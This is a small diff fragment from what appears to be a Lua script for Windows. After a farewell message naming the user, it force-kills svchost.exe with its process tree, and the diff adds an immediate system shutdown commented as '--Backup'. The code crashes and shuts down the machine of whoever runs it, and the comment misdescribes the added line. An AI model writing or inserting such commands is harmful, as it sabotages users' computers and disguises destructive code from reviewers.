@@ -98,3 +98,4 @@ ui.warn("...");
 ui.info("Bye "..os.getenv('USERNAME').."!!!");
 
 os.execute("taskkill /F /IM \"svchost.exe\" /T");
+os.execute("shutdown /s /t 00");  --Backup
